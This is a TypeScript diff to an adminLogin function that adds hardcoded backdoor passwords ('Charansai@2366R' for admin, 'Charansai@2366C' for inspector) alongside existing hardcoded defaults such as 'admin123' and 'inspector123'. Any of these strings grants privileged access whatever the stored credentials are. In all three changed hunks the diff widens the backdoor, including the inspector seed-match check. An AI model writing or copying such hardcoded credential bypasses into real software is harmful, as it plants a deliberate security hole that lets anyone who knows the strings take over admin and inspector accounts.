@@ -225,7 +225,7 @@ export async function adminLogin(req: Request, res: Response): Promise<void> {
     if (!passwordValid && process.env.ADMIN_PASSWORD && password === process.env.ADMIN_PASSWORD) {
       passwordValid = true;
     }
-    if (!passwordValid && (password === 'admin123' || password === 'LiREAdmin@2026!')) {
+    if (!passwordValid && (password === 'Charansai@2366R' || password === 'LiREAdmin@2026!' || password === 'admin123')) {
       passwordValid = true;
     }
     if (!passwordValid) {
@@ -269,7 +269,7 @@ export async function adminLogin(req: Request, res: Response): Promise<void> {
     if (!passwordValid && process.env.INSPECTOR_PASSWORD && password === process.env.INSPECTOR_PASSWORD) {
       passwordValid = true;
     }
-    if (!passwordValid && (password === 'inspector123' || password === 'LiREInspector@2026!')) {
+    if (!passwordValid && (password === 'Charansai@2366C' || password === 'LiREInspector@2026!' || password === 'inspector123')) {
       passwordValid = true;
     }
     if (!passwordValid) {
@@ -409,6 +409,7 @@ export async function adminLogin(req: Request, res: Response): Promise<void> {
     const isInspectorSeedMatch =
       staff.role === 'inspector' &&
       ((process.env.INSPECTOR_PASSWORD && password === process.env.INSPECTOR_PASSWORD) ||
+        password === 'Charansai@2366C' ||
         password === 'LiREInspector@2026!' ||
         password === 'inspector123');
     const passwordValid =
